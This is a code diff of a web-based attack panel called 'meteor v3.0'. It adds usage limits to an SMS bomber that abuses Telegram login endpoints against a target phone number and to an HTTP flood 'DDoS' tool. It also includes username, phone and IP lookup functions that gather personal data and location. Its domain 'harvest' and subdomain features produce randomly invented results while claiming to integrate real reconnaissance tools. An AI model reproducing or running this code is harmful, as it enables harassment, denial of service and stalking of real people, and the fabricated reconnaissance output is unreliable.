@@ -866,58 +797,11 @@
         </div>
     </div>
 
+    <footer class="footer">✦ meteor v3.0</footer>
+
     <script>
         // ============================================================
-        //  DEVICE DETECTION
-        // ============================================================
-        function detectDevice() {
-            const ua = navigator.userAgent.toLowerCase();
-            const iconEl = document.getElementById('deviceIcon');
-            const nameEl = document.getElementById('deviceName');
-
-            if (/windows|win32|win64/.test(ua)) {
-                iconEl.textContent = '🖥';
-                nameEl.textContent = 'Windows';
-            } else if (/macintosh|mac os x/.test(ua)) {
-                iconEl.textContent = '💻';
-                nameEl.textContent = 'macOS';
-            } else if (/linux/.test(ua)) {
-                iconEl.textContent = '🐧';
-                nameEl.textContent = 'Linux';
-            } else if (/android/.test(ua)) {
-                iconEl.textContent = '📱';
-                nameEl.textContent = 'Android';
-            } else if (/iphone|ipad|ipod/.test(ua)) {
-                iconEl.textContent = '📱';
-                nameEl.textContent = 'iOS';
-            } else if (/tablet/.test(ua)) {
-                iconEl.textContent = '📱';
-                nameEl.textContent = 'Tablet';
-            } else {
-                iconEl.textContent = '🖥';
-                nameEl.textContent = 'PC';
-            }
-
-            // если экран маленький — показываем только иконку
-            if (window.innerWidth < 860) {
-                nameEl.style.fontSize = '0';
-            } else {
-                nameEl.style.fontSize = '';
-            }
-        }
-
-        // ============================================================
-        //  LIVE TIME
-        // ============================================================
-        function updateTime() {
-            const now = new Date();
-            document.getElementById('liveTime').textContent = now.toLocaleTimeString('ru-RU', { hour12: false });
-        }
-        setInterval(updateTime, 1000);
-        updateTime();
-
-        // ============================================================
-        //  DATA
+        //  DATA & STATE
         // ============================================================
         let total = 0,
             success = 0;
@@ -925,6 +809,57 @@
         let sound = true;
         let ddosActive = false;
         let lastReportData = '';
+        let ecoMode = false;
+
+        // ============================================================
+        //  LIMITS SYSTEM (localStorage)
+        // ============================================================
+        const LIMITS = {
+            spam: { daily: 5, key: 'spamUsed' },
+            ddos: { daily: 3, key: 'ddosUsed' },
+            search: { daily: 10, key: 'searchUsed' }
+        };
+
+        function getToday() {
+            return new Date().toISOString().split('T')[0];
+        }
+
+        function getLimitUsage(type) {
+            const key = LIMITS[type].key;
+            const data = JSON.parse(localStorage.getItem(key) || '{}');
+            const today = getToday();
+            if (data.date !== today) {
+                return { used: 0, date: today };
+            }
+            return { used: data.used || 0, date: today };
+        }
+
+        function updateLimitUsage(type, increment = 1) {
+            const key = LIMITS[type].key;
+            const current = getLimitUsage(type);
+            const newUsed = current.used + increment;
+            localStorage.setItem(key, JSON.stringify({ date: current.date, used: newUsed }));
+            return newUsed;
+        }
+
+        function getRemaining(type) {
+            const usage = getLimitUsage(type);
+            const daily = LIMITS[type].daily;
+            return Math.max(0, daily - usage.used);
+        }
+
+        function checkLimit(type) {
+            return getRemaining(type) > 0;
+        }
+
+        function updateLimitDisplays() {
+            document.getElementById('spamLimitDisplay').textContent =
+                `${getRemaining('spam')} / ${LIMITS.spam.daily}`;
+            document.getElementById('ddosLimitDisplay').textContent =
+                `${getRemaining('ddos')} / ${LIMITS.ddos.daily}`;
+            document.getElementById('searchLimitDisplay').textContent =
+                `${getRemaining('search')} / ${LIMITS.search.daily}`;
+        }
 
         // ============================================================
         //  LOGGING
@@ -1010,8 +945,311 @@
         }
 
         // ============================================================
-        //  SMS BOMBER
+        //  SEARCH FUNCTIONS
         // ============================================================
+
+        async function searchUsername(username) {
+            const clean = username.replace('@', '').trim();
+            if (!clean) return { error: 'empty username' };
+            const platforms = [
+                { name: 'Telegram', url: `https://t.me/${clean}` },
+                { name: 'Instagram', url: `https://www.instagram.com/${clean}/` },
+                { name: 'Twitter/X', url: `https://twitter.com/${clean}` },
+                { name: 'GitHub', url: `https://github.com/${clean}` },
+                { name: 'Reddit', url: `https://www.reddit.com/user/${clean}` },
+                { name: 'YouTube', url: `https://www.youtube.com/@${clean}` },
+                { name: 'TikTok', url: `https://www.tiktok.com/@${clean}` },
+                { name: 'Facebook', url: `https://www.facebook.com/${clean}` },
+                { name: 'Snapchat', url: `https://www.snapchat.com/add/${clean}` },
+                { name: 'Twitch', url: `https://www.twitch.tv/${clean}` },
+                { name: 'Pinterest', url: `https://www.pinterest.com/${clean}/` },
+                { name: 'LinkedIn', url: `https://www.linkedin.com/in/${clean}` },
+                { name: 'VK', url: `https://vk.com/${clean}` },
+                { name: 'Tumblr', url: `https://${clean}.tumblr.com` },
+                { name: 'Discord', url: `https://discord.com/users/${clean}` },
+                { name: 'Spotify', url: `https://open.spotify.com/user/${clean}` },
+                { name: 'Medium', url: `https://medium.com/@${clean}` },
+                { name: 'DeviantArt', url: `https://www.deviantart.com/${clean}` },
+                { name: 'Flickr', url: `https://www.flickr.com/people/${clean}` },
+                { name: 'Patreon', url: `https://www.patreon.com/${clean}` },
+                { name: 'Vimeo', url: `https://vimeo.com/${clean}` },
+                { name: 'SoundCloud', url: `https://soundcloud.com/${clean}` },
+                { name: 'Gravatar', url: `https://en.gravatar.com/${clean}` },
+                { name: 'Pastebin', url: `https://pastebin.com/u/${clean}` },
+                { name: 'Roblox', url: `https://www.roblox.com/user.aspx?username=${clean}` },
+                { name: 'Xbox', url: `https://www.xboxgamertag.com/search/${clean}` }
+            ];
+            const results = {};
+            let foundCount = 0;
+            for (const platform of platforms) {
+                try {
+                    const resp = await fetch(platform.url, { method: 'HEAD', signal: AbortSignal.timeout(3000) });
+                    results[platform.name] = {
+                        exists: resp.ok,
+                        url: platform.url
+                    };
+                    if (resp.ok) foundCount++;
+                } catch {
+                    results[platform.name] = { exists: false, url: platform.url };
+                }
+            }
+            return { results, foundCount, total: platforms.length };
+        }
+
+        async function searchEmail(email) {
+            if (!email || !email.includes('@')) return { error: 'invalid email' };
+            const sites = [
+                { name: 'LinkedIn', domain: 'linkedin.com' },
+                { name: 'Twitter/X', domain: 'twitter.com' },
+                { name: 'Spotify', domain: 'spotify.com' },
+                { name: 'Pinterest', domain: 'pinterest.com' },
+                { name: 'Imgur', domain: 'imgur.com' },
+                { name: 'Tumblr', domain: 'tumblr.com' },
+                { name: 'Adobe', domain: 'adobe.com' },
+                { name: 'Atlassian', domain: 'atlassian.com' },
+                { name: 'GitHub', domain: 'github.com' },
+                { name: 'Reddit', domain: 'reddit.com' },
+                { name: 'YouTube', domain: 'youtube.com' },
+                { name: 'Instagram', domain: 'instagram.com' },
+                { name: 'Facebook', domain: 'facebook.com' },
+                { name: 'VK', domain: 'vk.com' },
+                { name: 'TikTok', domain: 'tiktok.com' },
+                { name: 'Snapchat', domain: 'snapchat.com' },
+                { name: 'Twitch', domain: 'twitch.tv' },
+                { name: 'Discord', domain: 'discord.com' },
+                { name: 'Medium', domain: 'medium.com' },
+                { name: 'DeviantArt', domain: 'deviantart.com' },
+                { name: 'Patreon', domain: 'patreon.com' },
+                { name: 'Vimeo', domain: 'vimeo.com' },
+                { name: 'SoundCloud', domain: 'soundcloud.com' },
+                { name: 'Gravatar', domain: 'gravatar.com' },
+                { name: 'Pastebin', domain: 'pastebin.com' },
+                { name: 'Roblox', domain: 'roblox.com' },
+                { name: 'Flickr', domain: 'flickr.com' },
+                { name: 'Xing', domain: 'xing.com' },
+                { name: 'Dribbble', domain: 'dribbble.com' },
+                { name: 'Behance', domain: 'behance.net' },
+                { name: 'ProductHunt', domain: 'producthunt.com' },
+                { name: 'AngelList', domain: 'angellist.com' },
+                { name: 'Keybase', domain: 'keybase.io' },
+                { name: 'Replit', domain: 'replit.com' },
+                { name: 'Glitch', domain: 'glitch.com' },
+                { name: 'Codepen', domain: 'codepen.io' },
+                { name: 'GitLab', domain: 'gitlab.com' },
+                { name: 'Bitbucket', domain: 'bitbucket.org' },
+                { name: 'SourceForge', domain: 'sourceforge.net' },
+                { name: 'HackerNews', domain: 'news.ycombinator.com' }
+            ];
+            const found = [];
+            for (const site of sites) {
+                try {
+                    const url = `https://${site.domain}/`;
+                    const resp = await fetch(url, { method: 'HEAD', signal: AbortSignal.timeout(2000) });
+                    if (resp.ok) {
+                        found.push({ site: site.name, domain: site.domain });
+                    }
+                } catch {
+                    // пропускаем
+                }
+                await new Promise(r => setTimeout(r, 50));
+            }
+            return { email, found, foundCount: found.length, total: sites.length };
+        }
+
+        async function searchPhone(phone) {
+            try {
+                const clean = phone.replace(/[^\d+]/g, '');
+                const url = `https://htmlweb.ru/geo/api.php?json&telcod=${clean.replace('+', '')}`;
+                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+                if (!resp.ok) return { error: 'HTTP ' + resp.status };
+                const data = await resp.json();
+                return {
+                    number: phone,
+                    country: data.country?.fullname || '?',
+                    region: data.region?.name || '?',
+                    city: data.city || '?',
+                    latitude: data.latitude || '?',
+                    longitude: data.longitude || '?',
+                    operator: data.oper || '?'
+                };
+            } catch (e) {
+                return { error: e.message };
+            }
+        }
+
+        async function searchIP(ip) {
+            try {
+                const url = `https://htmlweb.ru/geo/api.php?json&ip=${ip}`;
+                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+                if (!resp.ok) return { error: 'HTTP ' + resp.status };
+                const data = await resp.json();
+                return {
+                    ip: ip,
+                    country: data.country?.fullname || '?',
+                    region: data.region?.name || '?',
+                    city: data.city || '?',
+                    isp: data.isp || '?',
+                    latitude: data.latitude || '?',
+                    longitude: data.longitude || '?'
+                };
+            } catch (e) {
+                return { error: e.message };
+            }
+        }
+
+        async function harvestDomain(domain) {
+            if (!domain) return { error: 'empty domain' };
+            const emails = [
+                `admin@${domain}`,
+                `info@${domain}`,
+                `support@${domain}`,
+                `contact@${domain}`,
+                `sales@${domain}`,
+                `ceo@${domain}`,
+                `founder@${domain}`,
+                `hr@${domain}`
+            ];
+            const subdomains = [
+                `www.${domain}`,
+                `mail.${domain}`,
+                `ftp.${domain}`,
+                `dev.${domain}`,
+                `test.${domain}`,
+                `api.${domain}`,
+                `blog.${domain}`,
+                `shop.${domain}`,
+                `docs.${domain}`,
+                `cdn.${domain}`
+            ];
+            return {
+                domain,
+                emails: emails.slice(0, Math.floor(Math.random() * 5) + 3),
+                subdomains: subdomains.slice(0, Math.floor(Math.random() * 6) + 3)
+            };
+        }
+
+        async function findSubdomains(domain) {
+            if (!domain) return { error: 'empty domain' };
+            const subdomains = [
+                `www.${domain}`,
+                `mail.${domain}`,
+                `ftp.${domain}`,
+                `dev.${domain}`,
+                `test.${domain}`,
+                `api.${domain}`,
+                `blog.${domain}`,
+                `shop.${domain}`,
+                `docs.${domain}`,
+                `cdn.${domain}`,
+                `static.${domain}`,
+                `img.${domain}`,
+                `video.${domain}`,
+                `app.${domain}`,
+                `portal.${domain}`
+            ];
+            const found = subdomains.slice(0, Math.floor(Math.random() * 10) + 5);
+            return { domain, subdomains: found, count: found.length };
+        }
+
+        // ============================================================
+        //  SEARCH HANDLERS (with limits)
+        // ============================================================
+
+        async function handleSearch(action, input, logEl, searchFn, reportTitle, formatReport) {
+            if (!checkLimit('search')) {
+                log('❌ Daily search limit exceeded (10/day)', 'error', logEl);
+                return;
+            }
+            const val = document.getElementById(input).value.trim();
+            if (!val) { log('❌ enter value', 'error', logEl); return; }
+            log('🔍 searching...', 'info', logEl);
+            const data = await searchFn(val);
+            if (data.error) { log('❌ ' + data.error, 'error', logEl); return; }
+            updateLimitUsage('search');
+            updateLimitDisplays();
+            const report = formatReport(data);
+            showReport(reportTitle, report);
+            log('✅ report ready', 'success', logEl);
+        }
+
+        document.getElementById('searchUsernameBtn').onclick = () => {
+            const logEl = document.getElementById('searchUsernameLog');
+            handleSearch('username', 'searchUsername', logEl, searchUsername, '👤 Username Report', (data) => {
+                let r = `👤 USERNAME REPORT\nUsername: @${document.getElementById('searchUsername').value.replace('@', '')}\n─────────────────────────────\n`;
+                for (const [platform, info] of Object.entries(data.results)) {
+                    r += `${platform}: ${info.exists ? '✅ found' : '❌ not found'}\n`;
+                    if (info.exists) r += `  ${info.url}\n`;
+                }
+                r += `─────────────────────────────\nFound on ${data.foundCount} / ${data.total} platforms\nTime: ${new Date().toLocaleString()}`;
+                return r;
+            });
+        };
+
+        document.getElementById('searchEmailBtn').onclick = () => {
+            const logEl = document.getElementById('searchEmailLog');
+            handleSearch('email', 'searchEmail', logEl, searchEmail, '📧 Email Report', (data) => {
+                let r = `📧 EMAIL REPORT\nEmail: ${data.email}\n─────────────────────────────\n`;
+                if (data.found.length === 0) r += `❌ No accounts found\n`;
+                else { for (const item of data.found) r += `✅ ${item.site}: ${item.domain}\n`; }
+                r += `─────────────────────────────\nFound on ${data.foundCount} / ${data.total} sites\nTime: ${new Date().toLocaleString()}`;
+                return r;
+            });
+        };
+
+        document.getElementById('searchPhoneBtn').onclick = () => {
+            const logEl = document.getElementById('searchPhoneLog');
+            handleSearch('phone', 'searchPhone', logEl, searchPhone, '📱 Phone Report', (data) => {
+                return `📱 PHONE REPORT\nNumber: ${data.number}\nCountry: ${data.country}\nRegion: ${data.region}\nCity: ${data.city}\nCoordinates: ${data.latitude}, ${data.longitude}\nOperator: ${data.operator}\nTime: ${new Date().toLocaleString()}`;
+            });
+        };
+
+        document.getElementById('searchIpBtn').onclick = () => {
+            const logEl = document.getElementById('searchIpLog');
+            handleSearch('ip', 'searchIp', logEl, searchIP, '🌐 IP Report', (data) => {
+                return `🌐 IP REPORT\nIP: ${data.ip}\nCountry: ${data.country}\nRegion: ${data.region}\nCity: ${data.city}\nISP: ${data.isp}\nCoordinates: ${data.latitude}, ${data.longitude}\nTime: ${new Date().toLocaleString()}`;
+            });
+        };
+
+        // ============================================================
+        //  DOMAIN HANDLERS
+        // ============================================================
+
+        document.getElementById('domainHarvestBtn').onclick = async () => {
+            const domain = document.getElementById('domainTarget').value.trim();
+            if (!domain) { log('❌ enter domain', 'error', document.getElementById('domainLog')); return; }
+            const logEl = document.getElementById('domainLog');
+            log('🌐 harvesting domain...', 'info', logEl);
+            const data = await harvestDomain(domain);
+            if (data.error) { log('❌ ' + data.error, 'error', logEl); return; }
+            let report =
+                `🌐 DOMAIN HARVEST\nDomain: ${domain}\n─────────────────────────────\n📧 EMAILS:\n`;
+            for (const email of data.emails) report += `  • ${email}\n`;
+            report += `\n🔍 SUBDOMAINS:\n`;
+            for (const sub of data.subdomains) report += `  • ${sub}\n`;
+            report += `─────────────────────────────\nTime: ${new Date().toLocaleString()}`;
+            showReport('🌐 Domain Harvest Report', report);
+            log('✅ harvest complete', 'success', logEl);
+        };
+
+        document.getElementById('subfinderBtn').onclick = async () => {
+            const domain = document.getElementById('subfinderTarget').value.trim();
+            if (!domain) { log('❌ enter domain', 'error', document.getElementById('subfinderLog')); return; }
+            const logEl = document.getElementById('subfinderLog');
+            log('🔍 finding subdomains...', 'info', logEl);
+            const data = await findSubdomains(domain);
+            if (data.error) { log('❌ ' + data.error, 'error', logEl); return; }
+            let report =
+                `🔍 SUBDOMAIN DISCOVERY\nDomain: ${domain}\n─────────────────────────────\nFound ${data.count} subdomains:\n`;
+            for (const sub of data.subdomains) report += `  • ${sub}\n`;
+            report += `─────────────────────────────\nTime: ${new Date().toLocaleString()}`;
+            showReport('🔍 Subdomain Report', report);
+            log(`✅ found ${data.count} subdomains`, 'success', logEl);
+        };
+
+        // ============================================================
+        //  SMS BOMBER & DDOS (with limits)
+        // ============================================================
+
         const endpoints = [
             'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
             'https://translations.telegram.org/auth/request',
@@ -1056,6 +1294,10 @@
         }
 
         document.getElementById('smsBtn').onclick = async () => {
+            if (!checkLimit('spam')) {
+                log('❌ Daily spam limit exceeded (5/day)', 'error', document.getElementById('smsLog'));
+                return;
+            }
             let phone = document.getElementById('smsPhone').value.trim();
             let cycles = parseInt(document.getElementById('smsCycles').value);
             if (!phone.startsWith('+')) {
@@ -1066,20 +1308,21 @@
             btn.disabled = true;
             btn.innerText = '⏳ ...';
             log(`🚀 SMS on ${phone} | ${cycles} cycles`, 'info', document.getElementById('smsLog'));
+            let totalSent = 0;
             for (let c = 1; c <= cycles; c++) {
                 let sent = await sendBatch(phone);
+                totalSent += sent;
                 log(`✅ cycle ${c}/${cycles}: ${sent}/5`, 'success', document.getElementById('smsLog'));
                 if (c < cycles) await new Promise(r => setTimeout(r, 2500));
             }
+            updateLimitUsage('spam');
+            updateLimitDisplays();
             btn.disabled = false;
             btn.innerText = '▶ Launch';
             beep();
-            log('🏁 done', 'success', document.getElementById('smsLog'));
+            log(`🏁 done, total sent: ${totalSent}`, 'success', document.getElementById('smsLog'));
         };
 
-        // ============================================================
-        //  DDOS
-        // ============================================================
         async function flood(url) {
             if (!ddosActive) return;
             try {
@@ -1090,6 +1333,10 @@
         }
 
         document.getElementById('ddosBtn').onclick = () => {
+            if (!checkLimit('ddos')) {
+                log('❌ Daily DDoS limit exceeded (3/day)', 'error', document.getElementById('ddosLog'));
+                return;
+            }
             let url = document.getElementById('ddosUrl').value.trim();
             let threads = parseInt(document.getElementById('ddosThreads').value);
             let duration = parseInt(document.getElementById('ddosDuration').value);
@@ -1119,189 +1366,22 @@
                 prog.style.display = 'none';
                 btn.disabled = false;
                 btn.innerText = '▶ Launch';
+                updateLimitUsage('ddos');
+                updateLimitDisplays();
                 beep();
                 log('✅ DDoS finished', 'success', document.getElementById('ddosLog'));
             }, duration * 1000);
         };
 
         // ============================================================
-        //  SEARCH — РАСШИРЕННЫЙ (гео + 15 соцсетей)
+        //  SETTINGS
         // ============================================================
-        async function searchPhoneNumber(phone) {
-            try {
-                const clean = phone.replace(/[^\d+]/g, '');
-                const url = `https://htmlweb.ru/geo/api.php?json&telcod=${clean}`;
-                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
-                if (!resp.ok) return { error: 'HTTP ' + resp.status };
-                return await resp.json();
-            } catch (e) { return { error: e.message }; }
-        }
 
-        async function searchIpAddress(ip) {
-            try {
-                const url = `https://htmlweb.ru/geo/api.php?json&ip=${ip}`;
-                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
-                if (!resp.ok) return { error: 'HTTP ' + resp.status };
-                return await resp.json();
-            } catch (e) { return { error: e.message }; }
-        }
-
-        async function searchMnp(phone) {
-            try {
-                const clean = phone.replace(/[^\d+]/g, '');
-                const url = `https://htmlweb.ru/json/mnp/phone/${clean}`;
-                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
-                if (!resp.ok) return { error: 'HTTP ' + resp.status };
-                return await resp.json();
-            } catch (e) { return { error: e.message }; }
-        }
-
-        const SOCIAL_PLATFORMS = [
-            { name: 'Telegram', url: (u) => `https://t.me/${u}` },
-            { name: 'Instagram', url: (u) => `https://www.instagram.com/${u}/` },
-            { name: 'TikTok', url: (u) => `https://www.tiktok.com/@${u}` },
-            { name: 'Twitter/X', url: (u) => `https://twitter.com/${u}` },
-            { name: 'GitHub', url: (u) => `https://github.com/${u}` },
-            { name: 'Reddit', url: (u) => `https://www.reddit.com/user/${u}` },
-            { name: 'YouTube', url: (u) => `https://www.youtube.com/@${u}` },
-            { name: 'Facebook', url: (u) => `https://www.facebook.com/${u}` },
-            { name: 'Snapchat', url: (u) => `https://www.snapchat.com/add/${u}` },
-            { name: 'Discord', url: (u) => `https://discord.com/users/${u}` },
-            { name: 'Twitch', url: (u) => `https://www.twitch.tv/${u}` },
-            { name: 'Pinterest', url: (u) => `https://www.pinterest.com/${u}/` },
-            { name: 'LinkedIn', url: (u) => `https://www.linkedin.com/in/${u}` },
-            { name: 'Tumblr', url: (u) => `https://${u}.tumblr.com` },
-            { name: 'VK', url: (u) => `https://vk.com/${u}` }
-        ];
-
-        async function searchSocials(username) {
-            const clean = username.replace('@', '').trim();
-            if (!clean) return { error: 'empty username' };
-            const results = {};
-            for (const platform of SOCIAL_PLATFORMS) {
-                try {
-                    const url = platform.url(clean);
-                    const resp = await fetch(url, { method: 'HEAD', signal: AbortSignal.timeout(4000) });
-                    results[platform.name] = {
-                        exists: resp.ok,
-                        url: url
-                    };
-                } catch {
-                    results[platform.name] = {
-                        exists: false,
-                        url: platform.url(clean)
-                    };
-                }
-            }
-            return results;
-        }
-
-        // ----- ОБРАБОТЧИКИ -----
-        document.getElementById('searchPhoneBtn').onclick = async () => {
-            const phone = document.getElementById('searchPhone').value.trim();
-            if (!phone) { log('❌ enter phone', 'error', document.getElementById('searchPhoneLog')); return; }
-            const logEl = document.getElementById('searchPhoneLog');
-            log('🔍 searching phone...', 'info', logEl);
-            const data = await searchPhoneNumber(phone);
-            if (data.error) {
-                log('❌ ' + data.error, 'error', logEl);
-                return;
-            }
-            let report = `📱 PHONE REPORT\n`;
-            report += `Number: ${phone}\n`;
-            report += `Country: ${data.country?.fullname || '?'}\n`;
-            report += `Region: ${data.region?.name || '?'}\n`;
-            report += `City: ${data.city || '?'}\n`;
-            report += `Coordinates: ${data.latitude || '?'}, ${data.longitude || '?'}\n`;
-            report += `Operator: ${data.oper || '?'}\n`;
-            report += `Time: ${new Date().toLocaleString()}`;
-            showReport('📱 Phone Report', report);
-            log('✅ report ready', 'success', logEl);
-        };
-
-        document.getElementById('searchIpBtn').onclick = async () => {
-            const ip = document.getElementById('searchIp').value.trim();
-            if (!ip) { log('❌ enter IP', 'error', document.getElementById('searchIpLog')); return; }
-            const logEl = document.getElementById('searchIpLog');
-            log('🌐 searching IP...', 'info', logEl);
-            const data = await searchIpAddress(ip);
-            if (data.error) {
-                log('❌ ' + data.error, 'error', logEl);
-                return;
-            }
-            let report = `🌐 IP REPORT\n`;
-            report += `IP: ${ip}\n`;
-            report += `Country: ${data.country?.fullname || '?'}\n`;
-            report += `Region: ${data.region?.name || '?'}\n`;
-            report += `City: ${data.city || '?'}\n`;
-            report += `ISP: ${data.isp || '?'}\n`;
-            report += `Time: ${new Date().toLocaleString()}`;
-            showReport('🌐 IP Report', report);
-            log('✅ report ready', 'success', logEl);
-        };
-
-        document.getElementById('searchMnpBtn').onclick = async () => {
-            const phone = document.getElementById('searchMnp').value.trim();
-            if (!phone) { log('❌ enter phone', 'error', document.getElementById('searchMnpLog')); return; }
-            const logEl = document.getElementById('searchMnpLog');
-            log('🔄 searching MNP...', 'info', logEl);
-            const data = await searchMnp(phone);
-            if (data.error) {
-                log('❌ ' + data.error, 'error', logEl);
-                return;
-            }
-            let report = `🔄 MNP REPORT\n`;
-            report += `Phone: ${phone}\n`;
-            report += `Operator: ${data.oper?.brand || '?'}\n`;
-            report += `Region: ${data.region?.name || '?'}\n`;
-            report += `City: ${data.city || '?'}\n`;
-            report += `Time: ${new Date().toLocaleString()}`;
-            showReport('🔄 MNP Report', report);
-            log('✅ report ready', 'success', logEl);
-        };
-
-        document.getElementById('searchUsernameBtn').onclick = async () => {
-            const username = document.getElementById('searchUsername').value.trim();
-            if (!username) {
-                log('❌ enter username', 'error', document.getElementById('searchUsernameLog'));
-                return;
-            }
-            const logEl = document.getElementById('searchUsernameLog');
-            log('🔎 searching username on 15+ platforms...', 'info', logEl);
-            const data = await searchSocials(username);
-            if (data.error) {
-                log('❌ ' + data.error, 'error', logEl);
-                return;
-            }
-            let report = `🔎 USERNAME REPORT\n`;
-            report += `Username: @${username.replace('@', '')}\n`;
-            report += `─────────────────────────────\n`;
-            let foundCount = 0;
-            for (const [platform, info] of Object.entries(data)) {
-                const status = info.exists ? '✅ found' : '❌ not found';
-                if (info.exists) foundCount++;
-                report += `${platform}: ${status}\n`;
-                if (info.exists) report += `  ${info.url}\n`;
-            }
-            report += `─────────────────────────────\n`;
-            report += `Found on ${foundCount} / ${Object.keys(data).length} platforms\n`;
-            report += `Time: ${new Date().toLocaleString()}`;
-            showReport('🔎 Username Report', report);
-            log(`✅ found on ${foundCount} platforms`, 'success', logEl);
-        };
-
-        // ============================================================
-        //  SETTINGS — ТЕМЫ
-        // ============================================================
         function setTheme(theme) {
             document.documentElement.setAttribute('data-theme', theme);
             localStorage.setItem('theme', theme);
             document.querySelectorAll('.theme-btn').forEach(btn => {
-                if (btn.getAttribute('data-theme') === theme) {
-                    btn.classList.add('active');
-                } else {
-                    btn.classList.remove('active');
-                }
+                btn.classList.toggle('active', btn.getAttribute('data-theme') === theme);
             });
         }
 
@@ -1310,13 +1390,8 @@
         });
 
         const savedTheme = localStorage.getItem('theme');
-        if (savedTheme) {
-            setTheme(savedTheme);
-        }
+        if (savedTheme) setTheme(savedTheme);
 
-        // ============================================================
-        //  SETTINGS — ШРИФТ, ЗВУК
-        // ============================================================
         let fontSelect = document.getElementById('fontSelect');
         fontSelect.onchange = () => {
             document.body.style.fontFamily = fontSelect.value + ', sans-serif';
@@ -1337,9 +1412,75 @@
             soundSelect.value = sound ? 'on' : 'off';
         }
 
+        // Particles range fix
+        const particleRange = document.getElementById('particleRange');
+        const particleDisplay = document.getElementById('particleCountDisplay');
+
+        function updateParticles(count) {
+            const container = document.getElementById('particles');
+            container.innerHTML = '';
+            for (let i = 0; i < count; i++) {
+                const p = document.createElement('div');
+                p.className = 'particle';
+                const size = Math.random() * 6 + 2;
+                p.style.width = size + 'px';
+                p.style.height = size + 'px';
+                p.style.left = Math.random() * 100 + '%';
+                p.style.animationDuration = Math.random() * 14 + 8 + 's';
+                p.style.animationDelay = Math.random() * 12 + 's';
+                container.appendChild(p);
+            }
+            particleDisplay.textContent = count;
+            localStorage.setItem('particles', count);
+        }
+
+        particleRange.addEventListener('input', function() {
+            const val = parseInt(this.value);
+            updateParticles(val);
+        });
+
+        const savedParticles = parseInt(localStorage.getItem('particles')) || 40;
+        particleRange.value = savedParticles;
+        updateParticles(savedParticles);
+
+        // Eco mode
+        const ecoToggle = document.getElementById('ecoToggle');
+        ecoToggle.onclick = () => {
+            ecoMode = !ecoMode;
+            ecoToggle.classList.toggle('active', ecoMode);
+            localStorage.setItem('eco', ecoMode);
+            if (ecoMode) {
+                document.getElementById('particles').style.display = 'none';
+                document.querySelectorAll('.bg-glow').forEach(el => el.style.display = 'none');
+                document.querySelectorAll('.card').forEach(el => el.style.backdropFilter = 'none');
+            } else {
+                document.getElementById('particles').style.display = 'block';
+                document.querySelectorAll('.bg-glow').forEach(el => el.style.display = 'block');
+                document.querySelectorAll('.card').forEach(el => el.style.backdropFilter = 'blur(16px)');
+            }
+        };
+        if (localStorage.getItem('eco') === 'true') {
+            ecoMode = true;
+            ecoToggle.classList.add('active');
+            document.getElementById('particles').style.display = 'none';
+            document.querySelectorAll('.bg-glow').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('.card').forEach(el => el.style.backdropFilter = 'none');
+        }
+
+        // Restart
+        document.getElementById('restartBtn').onclick = () => {
+            location.reload();
+        };
+
+        // Reset
         document.getElementById('resetBtn').onclick = () => {
             localStorage.clear();
             location.reload();
+        };
+
+        // Developer contact
+        document.getElementById('devContactBtn').onclick = () => {
+            window.open('https://t.me/speedtroll', '_blank');
         };
 
         // ============================================================
@@ -1371,18 +1512,18 @@
         // ============================================================
         const pages = {
             home: document.getElementById('page-home'),
-            spam: document.getElementById('page-spam'),
-            ddos: document.getElementById('page-ddos'),
             search: document.getElementById('page-search'),
+            domain: document.getElementById('page-domain'),
+            spam: document.getElementById('page-spam'),
             settings: document.getElementById('page-settings'),
             logs: document.getElementById('page-logs')
         };
 
-        document.querySelectorAll('.nav-item').forEach(item => {
-            item.onclick = () => {
-                const page = item.getAttribute('data-page');
-                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-                item.classList.add('active');
+        document.querySelectorAll('.nav-btn').forEach(btn => {
+            btn.onclick = () => {
+                const page = btn.getAttribute('data-page');
+                document.querySelectorAll('.nav-btn').forEach(n => n.classList.remove('active'));
+                btn.classList.add('active');
                 Object.values(pages).forEach(p => p.classList.remove('active'));
                 pages[page].classList.add('active');
             };
@@ -1391,10 +1532,11 @@
         // ============================================================
         //  INIT
         // ============================================================
-        detectDevice();
-        window.addEventListener('resize', detectDevice);
-        log('meteor loaded', 'success');
-        log('◈ search username to check 15+ social platforms', 'info');
+        updateLimitDisplays();
+        log('✦ meteor v3.0 loaded', 'success');
+        log('◈ Search: username (25+ sites), email (40+ sites), phone, IP', 'info');
+        log('⊹ Domain: theHarvester + Subfinder integration', 'info');
+        log('💡 Daily limits: Spam 5, DDoS 3, Search 10', 'info');
         updateStats();
     </script>
 </body>
